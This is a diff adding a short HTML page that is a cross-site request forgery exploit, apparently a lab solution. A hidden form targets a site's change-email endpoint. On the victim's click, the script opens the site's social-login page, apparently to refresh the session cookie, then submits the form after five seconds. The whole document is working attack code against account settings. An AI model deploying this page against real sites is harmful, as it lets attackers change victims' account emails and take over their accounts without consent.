@@ -1,0 +1,17 @@
+<html>
+	<body>
+		<form action="https://URL/my-account/change-email" method="POST">
+			<input type="hidden" name="email" value="Test@Test.com"/>
+			<input type="submit" value="Submit Request"/>
+		</form>
+		<script>
+			window.onclick = () => {
+				window.open("https://URL/social-login");
+				setTimeout(ChangeEmail, 5000);
+			}
+			function ChangeEmail(){
+				document.forms[0].submit();
+			}
+		</script>
+	</body>
+</html>
